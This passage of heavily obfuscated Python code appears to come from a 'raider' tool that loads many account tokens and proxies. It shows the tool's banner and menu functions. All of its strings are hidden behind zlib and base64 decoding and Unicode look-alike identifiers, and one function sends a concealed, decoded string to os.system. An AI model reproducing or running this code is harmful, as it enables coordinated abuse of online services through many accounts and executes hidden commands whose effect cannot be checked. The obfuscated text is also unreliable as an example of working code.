0.9549099794348435j))]).decompress(b'x\xda3)\x08O4)\x08\x0f\x04\xe2\x14Og\x97\xcc\x9c\xa8" \x06\xd1\xc6Hll\x98\x14y\x83t\x13\x84=\xe88\xc5\xd3\xdf;,\xb7\xd4;,\x1bH\xe7\x05;\xa6{:;"\xabO\x01\x00\xcf\x879\x84')).decode().center(𝘀𝘦𝘭𝗳.size), f"{__𝘪𝙢𝗽𝗼𝗿𝘵__(𝗹𝘔𝙄𝘐𝘔𝗹𝙈𝗡𝗜𝘐𝗡𝙈𝗹𝘭𝘐𝗠𝘭𝘔𝗹𝙄𝘔𝘐𝙈𝗜𝘕𝙈𝗜𝗹𝘭𝘭𝗡𝗹[𝘳𝙤𝘂𝘯𝙙(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(b'ICAgICAgICAgICAgICAgICAgICAgIA==').decode()}{𝘳}{__𝙞𝙢𝙥𝘰𝗿𝙩__(𝘭𝗠𝘐𝗜𝙈𝘭𝙈𝘕𝙄𝗜𝗡𝗠𝗹𝗹𝙄𝙈𝙡𝙈𝙡𝘐𝗠𝙄𝙈𝗜𝙉𝙈𝙄𝘭𝘭𝘭𝘕𝗹[𝙧𝗼𝙪𝗻𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(b'IExvYWRlZCDigLk=').decode()}{𝗹𝘤}{𝘭𝗲𝘯(𝘁𝙤𝗸𝘦𝙣𝘴)}{𝙧}{__𝗶𝙢𝙥𝙤𝗿𝙩__(𝗹𝗠𝗜𝗜𝗠𝘭𝗠𝘕𝗜𝗜𝙉𝘔𝗹𝙡𝗜𝘔𝙡𝘔𝙡𝗜𝗠𝘐𝘔𝘐𝗡𝙈𝙄𝘭𝘭𝘭𝘕𝘭[𝗿𝗼𝘂𝗻𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(b'4oC6IHRva2VucyB8IExvYWRlZCDigLk=').decode()}{𝗹𝘤}{𝙡𝘦𝗻(𝘱𝙧𝘰𝙭𝗶𝗲𝘴)}{𝙧}{__𝙞𝗺𝘱𝙤𝙧𝙩__(𝗹𝘔𝙄𝙄𝙈𝘭𝙈𝘕𝗜𝘐𝙉𝗠𝗹𝙡𝘐𝗠𝙡𝘔𝗹𝙄𝙈𝙄𝗠𝙄𝗡𝗠𝘐𝘭𝗹𝘭𝗡𝘭[𝙧𝙤𝘶𝘯𝗱(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(b'PiBwcm94aWVz').decode()}".center(𝘀𝙚𝙡𝙛.size))
        for 𝗲𝗱𝙜𝗲 in 𝙚𝗱𝘨𝗲𝙨:
            𝘁𝙞𝙩𝘭𝘦 = 𝙩𝙞𝘁𝗹𝘦.replace(𝙚𝙙𝙜𝘦, __𝙞𝘮𝘱𝘰𝙧𝘵__(𝗹𝘔𝘐𝗜𝙈𝘭𝘔𝘕𝘐𝙄𝘕𝗠𝙡𝘭𝘐𝗠𝙡𝗠𝘭𝗜𝗠𝘐𝘔𝘐𝘕𝙈𝘐𝘭𝗹𝙡𝘕𝙡[𝘳𝗼𝘂𝘯𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝘳𝘵__(𝗹𝙈𝘐𝗜𝘔𝙡𝙈𝗡𝗜𝘐𝗡𝘔𝗹𝙡𝘐𝗠𝘭𝙈𝙡𝗜𝙈𝗜𝗠𝗜𝘕𝗠𝙄𝘭𝘭𝘭𝙉𝗹[𝘳𝙤𝘶𝗻𝗱(𝗮𝘣𝘀(0.033414786448087375 + 0.9994415701013385j))]).decompress(b'x\xdaK564O\x8b(\xb1\x04\x00\n\x8f\x02l')).decode().format(𝘍𝙤𝗿𝘦.LIGHTCYAN_EX, 𝘦𝙙𝙜𝙚, 𝗙𝘰𝙧𝗲.RESET))
        𝘱𝙧𝗶𝙣𝙩(𝙩𝘪𝙩𝘭𝙚)

    def raider_options(self):
        𝙚𝘥𝙜𝗲𝘴 = [__𝙞𝙢𝗽𝗼𝙧𝙩__(𝗹𝗠𝙄𝗜𝗠𝘭𝙈𝘕𝗜𝙄𝙉𝘔𝘭𝗹𝙄𝘔𝙡𝗠𝘭𝘐𝙈𝘐𝙈𝙄𝘕𝙈𝗜𝙡𝙡𝗹𝗡𝗹[𝘳𝗼𝙪𝗻𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝘳𝘁__(𝗹𝘔𝙄𝙄𝙈𝙡𝘔𝗡𝗜𝘐𝙉𝘔𝗹𝙡𝘐𝘔𝙡𝙈𝙡𝘐𝙈𝗜𝙈𝙄𝗡𝘔𝙄𝘭𝘭𝗹𝗡𝗹[𝘳𝘰𝘂𝗻𝗱(𝘢𝘣𝘀(0.6710526905768082 + 0.7414096617050702j))]).decompress(b'x\xda+/*\xb6\x05\x00\x04Y\x01\x9a')).decode(), __𝙞𝗺𝗽𝙤𝗿𝘵__(𝙡𝙈𝙄𝗜𝙈𝘭𝘔𝗡𝘐𝗜𝘕𝙈𝘭𝘭𝗜𝘔𝗹𝙈𝘭𝗜𝙈𝘐𝘔𝘐𝙉𝙈𝗜𝙡𝙡𝗹𝙉𝘭[𝘳𝘰𝘂𝗻𝘥(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝘳𝙩__(𝘭𝗠𝙄𝗜𝙈𝙡𝗠𝙉𝙄𝙄𝗡𝘔𝙡𝙡𝗜𝗠𝗹𝙈𝙡𝘐𝘔𝗜𝙈𝗜𝙉𝘔𝗜𝙡𝙡𝙡𝙉𝘭[𝗿𝘰𝙪𝗻𝙙(𝙖𝗯𝙨(0.6265009736862343 + 0.7794206373776618j))]).decompress(b'x\xda+/,\xb6\x05\x00\x04V\x01\x99')).decode(), __𝘪𝘮𝗽𝘰𝘳𝘵__(𝘭𝗠𝙄𝘐𝗠𝘭𝗠𝙉𝙄𝗜𝙉𝘔𝙡𝙡𝘐𝘔𝙡𝘔𝙡𝙄𝘔𝘐𝗠𝙄𝘕𝙈𝗜𝙡𝘭𝗹𝘕𝘭[𝙧𝙤𝘂𝙣𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝗼𝙧𝙩__(𝗹𝙈𝙄𝗜𝗠𝙡𝘔𝙉𝙄𝗜𝙉𝙈𝘭𝘭𝘐𝘔𝗹𝘔𝙡𝙄𝙈𝘐𝙈𝗜𝗡𝘔𝙄𝙡𝘭𝘭𝙉𝗹[𝙧𝙤𝘶𝗻𝙙(𝘢𝙗𝘀(0.5185102498792363 + 0.8550714126727498j))]).decompress(b'x\xda3)\x08v\x04\x00\x03\x0b\x019')).decode(), __𝙞𝙢𝗽𝗼𝘳𝘵__(𝙡𝗠𝙄𝙄𝙈𝗹𝘔𝘕𝙄𝗜𝗡𝙈𝙡𝗹𝗜𝙈𝘭𝗠𝙡𝘐𝙈𝗜𝘔𝙄𝘕𝗠𝗜𝙡𝘭𝙡𝘕𝗹[𝗿𝘰𝘂𝙣𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝘰𝗿𝙩__(𝙡𝗠𝗜𝘐𝘔𝘭𝙈𝗡𝘐𝙄𝙉𝙈𝗹𝙡𝘐𝘔𝗹𝙈𝘭𝘐𝙈𝙄𝘔𝘐𝗡𝙈𝗜𝙡𝙡𝗹𝙉𝘭[𝙧𝙤𝘶𝙣𝙙(𝘢𝘣𝘀(0.22767058234570559 + 0.9737382122184419j))]).decompress(b'x\xda3)\x08/\x01\x00\x03F\x01p')).decode(), __𝗶𝙢𝘱𝗼𝗿𝘵__(𝘭𝙈𝗜𝙄𝘔𝗹𝙈𝙉𝗜𝘐𝙉𝗠𝗹𝗹𝙄𝙈𝘭𝘔𝙡𝗜𝗠𝘐𝗠𝘐𝘕𝘔𝙄𝗹𝗹𝗹𝙉𝙡[𝗿𝙤𝘶𝘯𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝗼𝘳𝘵__(𝗹𝘔𝘐𝙄𝘔𝙡𝘔𝗡𝙄𝘐𝙉𝗠𝙡𝙡𝙄𝘔𝗹𝙈𝘭𝙄𝗠𝗜𝗠𝙄𝘕𝙈𝙄𝙡𝙡𝘭𝙉𝙡[𝗿𝘰𝙪𝘯𝘥(𝘢𝘣𝙨(0.6018428774390583 + 0.7986145195749165j))]).decompress(b'x\xda3)\x08v\x06\x00\x03\r\x01;')).decode(), __𝗶𝘮𝙥𝗼𝘳𝘁__(𝗹𝙈𝗜𝗜𝗠𝗹𝘔𝘕𝘐𝘐𝗡𝙈𝗹𝘭𝗜𝗠𝙡𝘔𝘭𝘐𝙈𝗜𝗠𝗜𝘕𝙈𝘐𝗹𝙡𝘭𝙉𝘭[𝘳𝘰𝘂𝙣𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝗼𝗿𝙩__(𝗹𝗠𝙄𝗜𝘔𝘭𝙈𝘕𝗜𝗜𝘕𝙈𝙡𝙡𝘐𝙈𝗹𝘔𝘭𝙄𝘔𝙄𝙈𝘐𝘕𝙈𝗜𝘭𝙡𝘭𝘕𝘭[𝙧𝗼𝘂𝙣𝘥(𝙖𝘣𝘀(0.7495364969669244 + 0.6619630198995649j))]).decompress(b'x\xda3)\x08/\x07\x00\x03I\x01s')).decode(), __𝗶𝗺𝗽𝗼𝘳𝘵__(𝘭𝘔𝙄𝘐𝙈𝗹𝗠𝗡𝘐𝘐𝘕𝗠𝗹𝗹𝘐𝙈𝘭𝗠𝙡𝙄𝙈𝗜𝘔𝘐𝙉𝘔𝗜𝗹𝘭𝗹𝘕𝗹[𝗿𝗼𝙪𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝗼𝙧𝙩__(𝘭𝙈𝙄𝘐𝙈𝗹𝘔𝗡𝘐𝙄𝘕𝗠𝙡𝗹𝙄𝗠𝗹𝙈𝘭𝘐𝘔𝗜𝘔𝗜𝙉𝗠𝙄𝙡𝙡𝘭𝗡𝘭[𝘳𝘰𝘂𝗻𝘥(𝘢𝗯𝘀(0.5120435851252781 + 0.8589594675722785j))]).decompress(b'x\xda3)\x08/\x03\x00\x03H\x01r')).decode(), __𝙞𝘮𝗽𝘰𝗿𝘁__(𝙡𝙈𝘐𝘐𝗠𝙡𝙈𝘕𝘐𝘐𝗡𝗠𝘭𝙡𝗜𝗠𝘭𝘔𝙡𝙄𝙈𝙄𝙈𝙄𝘕𝗠𝘐𝘭𝘭𝙡𝗡𝙡[𝗿𝗼𝘂𝗻𝘥(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝙧𝘁__(𝘭𝘔𝙄𝘐𝗠𝙡𝙈𝘕𝘐𝗜𝙉𝗠𝘭𝘭𝗜𝗠𝘭𝙈𝘭𝘐𝘔𝙄𝘔𝗜𝗡𝗠𝙄𝙡𝙡𝙡𝗡𝙡[𝘳𝘰𝙪𝙣𝘥(𝗮𝗯𝘴(0.6626422507412617 + 0.7489360770670317j))]).decompress(b'x\xda3)\x08/\x05\x00\x03G\x01q')).decode()]
        𝘁𝗶𝘵𝙡𝘦 = __𝙞𝗺𝙥𝘰𝗿𝘵__(𝙡𝙈𝘐𝗜𝗠𝗹𝘔𝙉𝘐𝘐𝗡𝘔𝘭𝘭𝘐𝘔𝘭𝘔𝙡𝘐𝗠𝗜𝗠𝙄𝙉𝗠𝘐𝗹𝗹𝘭𝙉𝗹[𝗿𝘰𝙪𝙣𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝗿𝙩__(𝘭𝗠𝗜𝗜𝘔𝙡𝘔𝗡𝘐𝗜𝘕𝙈𝘭𝗹𝘐𝙈𝘭𝗠𝗹𝗜𝘔𝙄𝙈𝙄𝘕𝙈𝗜𝗹𝘭𝙡𝘕𝗹[𝙧𝗼𝙪𝘯𝘥(𝗮𝗯𝘴(0.6041710933575285 + 0.7968546228460801j))]).decompress(b'x\xdaK56\xf0N\xc5\x81\x01n@\x07\x86')).decode().format(__𝙞𝙢𝙥𝙤𝘳𝘵__(𝗹𝗠𝗜𝘐𝘔𝙡𝗠𝙉𝘐𝘐𝘕𝙈𝙡𝘭𝙄𝘔𝗹𝗠𝘭𝗜𝗠𝙄𝘔𝘐𝘕𝗠𝗜𝘭𝙡𝗹𝘕𝗹[𝙧𝗼𝘂𝙣𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝘳𝘵__(𝙡𝙈𝘐𝗜𝗠𝙡𝗠𝗡𝗜𝗜𝘕𝗠𝘭𝗹𝗜𝙈𝘭𝘔𝙡𝗜𝙈𝘐𝘔𝗜𝘕𝙈𝗜𝘭𝙡𝙡𝙉𝗹[𝙧𝙤𝘂𝗻𝘥(𝘢𝙗𝘀(0.4784284255854335 + 0.8781265521505675j))]).decompress(b'x\xda3)\x08/1)\x08v\x1c\xc5\xf4\xc6\xe1\xa5\x00~>t8')).decode().center(𝘀𝙚𝙡𝗳.size), __𝘪𝗺𝙥𝙤𝙧𝙩__(𝙡𝗠𝙄𝘐𝙈𝘭𝗠𝙉𝙄𝗜𝗡𝙈𝗹𝗹𝗜𝘔𝙡𝘔𝘭𝙄𝙈𝘐𝗠𝘐𝗡𝘔𝙄𝘭𝙡𝙡𝗡𝘭[𝘳𝗼𝘂𝘯𝘥(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝗿𝙩__(𝗹𝙈𝙄𝘐𝙈𝙡𝗠𝙉𝗜𝗜𝗡𝘔𝗹𝗹𝘐𝘔𝘭𝙈𝙡𝗜𝙈𝙄𝙈𝙄𝗡𝘔𝘐𝙡𝘭𝘭𝙉𝙡[𝗿𝗼𝘶𝗻𝗱(𝗮𝙗𝘀(0.443575926936599 + 0.8962367974159157j))]).decompress(b'x\xda3)\x08v\xf6\xf4\xf5.\xf2u\xf1p.\xadt\xf2N2\xca)\x8d\x8a\xf0L\xf7tvD\xc2.\xce\x85U\x8eF\xe5E\xc5\xe9a\xee\x96EQ\xe1&\xe9A\xb9\x96\x95I\xe1n\x06)\xeea\x95`5 3B\xc0f\x04$\xe5V\x14$\xe5B\xc5a\x18,\x9f\x04\x94w\xd4\x0f\xa8\xb2@3\x1flGf\x8e\xa7\xa7-\x00w\xe4/B')).decode().center(𝘴𝗲𝙡𝘧.size), __𝙞𝗺𝙥𝘰𝘳𝙩__(𝙡𝗠𝗜𝙄𝘔𝘭𝙈𝙉𝙄𝗜𝗡𝘔𝙡𝘭𝙄𝘔𝙡𝗠𝘭𝘐𝗠𝙄𝗠𝗜𝘕𝗠𝗜𝙡𝘭𝗹𝙉𝘭[𝘳𝘰𝘂𝘯𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝙤𝙧𝙩__(𝗹𝗠𝙄𝘐𝗠𝘭𝙈𝙉𝙄𝘐𝘕𝘔𝘭𝘭𝘐𝘔𝙡𝙈𝘭𝙄𝙈𝙄𝙈𝙄𝗡𝙈𝘐𝗹𝗹𝙡𝙉𝙡[𝘳𝙤𝘂𝘯𝙙(𝘢𝘣𝘀(0.49810304914455383 + 0.8671178422987836j))]).decompress(b"x\xda3)\x08v\xf6\xf4\xf5.\xf2u\xf1q.\xadt\xf2\x8d\nw3\x8a\x8a\xf0L\xf7tvD\xc2.\xce\x85U\x8e\xc6\xe5E\xc5\xe9\x81ya\x06)\xee\x96\xa5\x9e\xae~\xc5\x89\xe1~Ep5 3B\xc0f\x84'\x19\xe5dE\x05;y\x03\xe9R\xb8Y`\xf94\xa0\xbc\xa3~@\x95\x05\x9a\xf9`;2s<=m\x01A\xe2.\xb5")).decode().center(𝘴𝙚𝘭𝗳.size), __𝙞𝘮𝘱𝗼𝙧𝘁__(𝗹𝘔𝘐𝗜𝗠𝗹𝗠𝙉𝘐𝘐𝘕𝙈𝙡𝘭𝘐𝙈𝗹𝙈𝙡𝙄𝘔𝗜𝗠𝘐𝘕𝙈𝙄𝗹𝘭𝙡𝙉𝙡[𝙧𝙤𝘂𝗻𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝗿𝙩__(𝘭𝗠𝘐𝘐𝘔𝗹𝙈𝙉𝙄𝙄𝘕𝙈𝗹𝘭𝙄𝙈𝗹𝗠𝙡𝙄𝗠𝗜𝘔𝗜𝘕𝘔𝘐𝗹𝘭𝗹𝘕𝘭[𝙧𝙤𝘂𝙣𝗱(𝘢𝙗𝙨(0.32484387282700733 + 0.945767655551167j))]).decompress(b"x\xda3)\x08v\xf6\xf4\xf5.\xf2u\tp.\xadt\nIvw+I\n\x0f\xab\xf4tvLG`\x17\xe7\xc2*G\x93\xf2\xa2\xe2\xf4\xc0p\xbf\xac\xa8\x08'\x03O7/\xc3$\xf7\xb0*\xb8\x1a\x90\x19!`3\\\x12\xdd\xddJ\xa3\x8cB\xd3Crs\xb2\x12+\x91\xe5\xb3\x80\xf2\x8e\xfa\x01U\x16\xe9\xa8\xe6\x83\xed\xc8\xcc\xf1\xf4\xb4\x05\x00bB/\x02")).decode().center(𝘴𝙚𝘭𝙛.size), __𝘪𝗺𝗽𝙤𝙧𝘁__(𝙡𝗠𝘐𝙄𝗠𝘭𝗠𝘕𝙄𝙄𝙉𝘔𝙡𝙡𝙄𝙈𝗹𝘔𝙡𝗜𝙈𝙄𝙈𝙄𝙉𝘔𝙄𝗹𝘭𝘭𝙉𝗹[𝙧𝘰𝙪𝘯𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝘳𝘵__(𝘭𝙈𝘐𝘐𝘔𝘭𝘔𝙉𝗜𝗜𝙉𝙈𝘭𝙡𝘐𝘔𝗹𝗠𝗹𝗜𝘔𝙄𝙈𝙄𝘕𝙈𝘐𝗹𝙡𝗹𝗡𝙡[𝗿𝘰𝘶𝗻𝗱(𝙖𝙗𝙨(0.5551051239907683 + 0.8317802001245244j))]).decompress(b'x\xda3)\x08v\xf6\xf4\xf5.\xf2u\tq.\xadt\nM2*\xc9I\xcatrIt\x0f\xcbJ4\n\xab\xf4tvL\xf7tvq.\xacr4-/*N\x0f2\x0e+Hr\x0fL\x0f4\xca\xc8\x894*N\x87\xc8\x031\xc8\x8c\x10\x88\x19\x89\x1e^9\x91\xe1\x81\xe9\xa1\xc6N\x19I\xe1\x869\xc9\x990\xf9<\xa0\xbc\xa3~@\x95\x05B\x1f\x1c\xbbd\xe6xz\xda\x02\x00\x9a\xd2/\x88')).decode().center(𝙨𝘦𝘭𝘧.size), __𝗶𝗺𝗽𝙤𝘳𝙩__(𝘭𝙈𝗜𝗜𝙈𝙡𝙈𝘕𝙄𝗜𝗡𝙈𝙡𝗹𝗜𝙈𝘭𝘔𝘭𝙄𝙈𝘐𝗠𝙄𝗡𝙈𝗜𝙡𝙡𝘭𝗡𝘭[𝗿𝙤𝙪𝙣𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝘳𝘁__(𝙡𝙈𝙄𝗜𝗠𝗹𝗠𝙉𝗜𝘐𝙉𝘔𝙡𝗹𝗜𝙈𝘭𝗠𝗹𝙄𝙈𝗜𝗠𝗜𝙉𝗠𝘐𝘭𝘭𝘭𝗡𝗹[𝗿𝗼𝘂𝗻𝙙(𝗮𝗯𝘀(0.011307356671315105 + 0.9999360697990185j))]).decompress(b'x\xda3)\x08v\xf6\xf4\xf5.\xf2u\x89p.\xadt\n\x8e\nw\xcbJq\xb7\xac\xf4tvLG`\x17\xe7\xc2*\xd7\xf2\xf2\xa2\xe2\xf4\xc0\xdc\x9c2OW\xbf\xfc\xc8p\xd3\xbc\xa8\x08O\x84\x1a\x90\x19!`3\xdc\x93\x8c\xbdJ\x92+\x9dB\x92\xdd\xddJ\x92\xc2\xc3*\xe1\xf2Y. y\xb7T\xf7\x1c\x03T\xf3\xc1vd\xe6xz\xda\x02\x00\x9e\xb3/\x9a')).decode().center(𝘴𝘦𝘭𝙛.size), __𝗶𝘮𝗽𝙤𝗿𝘁__(𝘭𝗠𝗜𝙄𝘔𝘭𝗠𝙉𝗜𝙄𝗡𝗠𝙡𝙡𝗜𝗠𝙡𝗠𝗹𝘐𝗠𝘐𝘔𝗜𝘕𝗠𝙄𝘭𝗹𝗹𝙉𝙡[𝘳𝙤𝘶𝙣𝗱(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝙤𝙧𝘵__(𝘭𝘔𝙄𝘐𝘔𝘭𝗠𝗡𝙄𝙄𝘕𝘔𝘭𝗹𝙄𝗠𝘭𝗠𝘭𝗜𝘔𝙄𝗠𝗜𝗡𝙈𝗜𝗹𝗹𝘭𝗡𝗹[𝗿𝙤𝘶𝗻𝙙(𝘢𝙗𝘴(0.45177843437940024 + 0.8921301733658031j))]).decompress(b'x\xda3)\x08/7)\x08v\x1c\xc5\xf4\xc6\xe1e\x00\x82\xaat<')).decode().center(𝙨𝙚𝘭𝗳.size))
        for 𝗲𝙙𝘨𝘦 in 𝘦𝙙𝙜𝙚𝘀:
            𝙩𝘪𝙩𝘭𝙚 = 𝘵𝘪𝘁𝗹𝗲.replace(𝙚𝙙𝘨𝘦, __𝗶𝘮𝙥𝘰𝗿𝘁__(𝘭𝙈𝘐𝘐𝗠𝙡𝗠𝗡𝙄𝘐𝘕𝗠𝘭𝙡𝘐𝙈𝙡𝘔𝗹𝗜𝗠𝗜𝗠𝗜𝗡𝘔𝘐𝘭𝘭𝘭𝘕𝙡[𝙧𝗼𝙪𝗻𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝘰𝗿𝙩__(𝘭𝗠𝘐𝙄𝙈𝗹𝙈𝘕𝘐𝗜𝙉𝙈𝗹𝙡𝗜𝙈𝗹𝗠𝙡𝙄𝗠𝘐𝗠𝘐𝗡𝙈𝘐𝙡𝘭𝙡𝙉𝘭[𝘳𝙤𝘶𝘯𝙙(𝗮𝗯𝘀(0.26131808565864345 + 0.9652527431236348j))]).decompress(b'x\xdaK564O\x8b(\xb1\x04\x00\n\x8f\x02l')).decode().format(𝙁𝙤𝗿𝘦.LIGHTCYAN_EX, 𝙚𝙙𝘨𝗲, 𝘍𝙤𝘳𝙚.RESET))
        𝙥𝗿𝗶𝗻𝘵(𝙩𝘪𝘵𝗹𝗲)
        𝗼𝘀.system(__𝙞𝙢𝙥𝗼𝗿𝘵__(𝗹𝘔𝗜𝗜𝙈𝗹𝙈𝗡𝗜𝘐𝗡𝘔𝘭𝘭𝙄𝙈𝘭𝘔𝗹𝙄𝘔𝙄𝗠𝘐𝗡𝘔𝘐𝗹𝙡𝙡𝗡𝘭[𝘳𝘰𝘂𝗻𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝙤𝙧𝘵__(𝙡𝙈𝘐𝗜𝙈𝗹𝘔𝗡𝙄𝙄𝗡𝙈𝗹𝘭𝘐𝗠𝙡𝙈𝙡𝗜𝘔𝘐𝗠𝙄𝙉𝗠𝘐𝘭𝙡𝙡𝗡𝗹[𝗿𝗼𝘂𝗻𝙙(𝘢𝗯𝙨(0.42329861437602145 + 0.9059902223905842j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\x01\x00-\xdf\x05\x93')).decode())

    def run(self):
        𝙤𝗽𝙩𝘪𝗼𝘯𝙨 = [𝙨𝘦𝙡𝙛.render_ascii(), 𝘴𝙚𝘭𝗳.raider_options()]
        ([𝘰𝘱𝘁𝗶𝘰𝘯] for 𝙤𝘱𝙩𝗶𝗼𝙣 in 𝘰𝙥𝙩𝗶𝘰𝗻𝘀)

    def log(self, text=None, color=None, token=None, log=None):
        𝘳𝗲𝘀𝙥𝗼𝘯𝙨𝗲 = __𝙞𝘮𝘱𝙤𝗿𝙩__(𝘭𝘔𝘐𝘐𝗠𝗹𝙈𝗡𝗜𝙄𝙉𝗠𝘭𝙡𝗜𝗠𝗹𝗠𝘭𝙄𝙈𝙄𝗠𝗜𝗡𝙈𝙄𝘭𝙡𝘭𝘕𝗹[𝙧𝘰𝘶𝘯𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝙤𝙧𝘵__(𝗹𝘔𝙄𝘐𝗠𝘭𝙈𝘕𝘐𝙄𝘕𝙈𝗹𝗹𝙄𝘔𝙡𝘔𝙡𝙄𝙈𝘐𝗠𝗜𝙉𝗠𝗜𝙡𝗹𝗹𝙉𝙡[𝘳𝗼𝘶𝙣𝘥(𝗮𝘣𝘴(0.9685545581950523 + 0.24880126165191982j))]).decompress(b'x\xda\x0b7.\xb1L564O\x0b3H\x07\x00\x17\x01\x03\x8b')).decode().format(𝗙𝗼𝘳𝙚.LIGHTBLACK_EX, 𝗱𝘢𝘁𝗲𝘵𝙞𝘮𝗲.now().strftime(__𝘪𝙢𝙥𝗼𝗿𝘵__(𝘭𝙈𝘐𝘐𝘔𝘭𝙈𝘕𝙄𝗜𝙉𝘔𝙡𝘭𝘐𝗠𝘭𝗠𝘭𝙄𝙈𝘐𝘔𝘐𝘕𝙈𝗜𝘭𝘭𝘭𝘕𝗹[𝗿𝗼𝘂𝙣𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝙤𝗿𝘵__(𝙡𝙈𝘐𝙄𝘔𝗹𝘔𝘕𝙄𝘐𝙉𝗠𝘭𝗹𝗜𝙈𝗹𝘔𝗹𝗜𝗠𝘐𝗠𝙄𝘕𝙈𝗜𝙡𝘭𝗹𝘕𝙡[𝘳𝗼𝘂𝘯𝗱(𝙖𝘣𝘀(0.4245286887931311 + 0.9054144865152008j))]).decompress(b'x\xda\xf3\nM7\xf3\n50\xf3\n\xf3\xb5\x05\x00\x16\xe9\x03l')).decode()), 𝗙𝗼𝘳𝘦.RESET)
        if 𝘵𝗲𝙭𝘁:
            𝘳𝘦𝘀𝗽𝗼𝘯𝘀𝙚 += __𝙞𝘮𝘱𝙤𝗿𝙩__(𝗹𝙈𝙄𝗜𝗠𝙡𝘔𝘕𝙄𝘐𝙉𝙈𝘭𝗹𝙄𝘔𝘭𝘔𝗹𝙄𝘔𝙄𝗠𝘐𝗡𝗠𝗜𝗹𝙡𝗹𝘕𝙡[𝘳𝙤𝘶𝗻𝙙(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝙧𝘵__(𝙡𝘔𝘐𝘐𝗠𝙡𝙈𝗡𝙄𝗜𝘕𝘔𝙡𝙡𝙄𝙈𝗹𝙈𝘭𝙄𝙈𝘐𝗠𝙄𝗡𝘔𝗜𝗹𝗹𝗹𝘕𝙡[𝘳𝙤𝘶𝗻𝙙(𝗮𝗯𝘀(0.7780747565898904 + 0.6281716908278999j))]).decompress(b'x\xda\x0b7.\xb1L564O\x0b3H\x07\x00\x17\x01\x03\x8b')).decode().format(𝗰𝙤𝘭𝘰𝗿, 𝙩𝗲𝘅𝙩, 𝙁𝙤𝗿𝙚.RESET)
        if 𝙩𝙤𝙠𝘦𝗻:
            𝘳𝗲𝘴𝘱𝙤𝗻𝘴𝘦 += 𝘁𝘰𝙠𝘦𝘯
        if 𝘭𝗼𝘨:
            𝘳𝗲𝘴𝘱𝙤𝘯𝘴𝙚 += __𝘪𝗺𝘱𝘰𝙧𝘵__(𝙡𝘔𝘐𝗜𝗠𝙡𝙈𝘕𝙄𝘐𝗡𝘔𝙡𝘭𝙄𝗠𝗹𝙈𝘭𝗜𝗠𝗜𝘔𝗜𝗡𝙈𝙄𝙡𝘭𝘭𝙉𝙡[𝗿𝘰𝘶𝙣𝗱(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝘰𝙧𝘵__(𝙡𝘔𝗜𝙄𝘔𝗹𝗠𝙉𝘐𝙄𝗡𝙈𝘭𝗹𝗜𝙈𝗹𝗠𝗹𝗜𝘔𝗜𝘔𝙄𝗡𝙈𝘐𝘭𝗹𝗹𝘕𝙡[𝗿𝘰𝘂𝙣𝙙(𝙖𝙗𝘴(0.6533915347278266 + 0.7570201465918958j))]).decompress(b'x\xda\xf3t\xce0O\x8b(\xb1L56(\x00\x00\x18\xc2\x03\xcf')).decode().format(𝙁𝙤𝘳𝘦.LIGHTBLACK_EX, 𝘭𝗼𝗴, 𝙁𝗼𝘳𝗲.RESET)
        𝘱𝙧𝘪𝗻𝘵(𝙧𝗲𝘴𝗽𝘰𝗻𝘴𝗲)

    def prompt(self, text, ask=None):
